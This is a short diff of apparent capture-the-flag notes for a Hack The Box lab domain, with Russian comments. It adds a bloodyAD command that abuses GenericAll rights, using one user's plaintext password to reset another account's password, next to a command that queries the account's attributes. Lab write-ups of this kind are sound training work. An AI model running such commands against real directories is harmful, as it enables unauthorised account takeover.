@@ -62,7 +62,11 @@ YXkQXyzbnB69RuDjUy_a2s0MpSEIH8SY
 
 Silvercore_21
 -------------------------------------------------------------------------------------------------------------------------------------------------
+# GenericAll
 
+# смена пароля 
+    bloodyAD -u ant.edwards -p 'Antman2025!' -d puppy.htb --host puppy.htb set password adam.silver 'NewP@ssw0rd123!'
+    
 # получение информации об аккаунте  adam.silver
      bloodyAD -u ant.edwards -p 'Antman2025!' -d puppy.htb --host puppy.htb get object adam.silver --attr userAccountControl
  
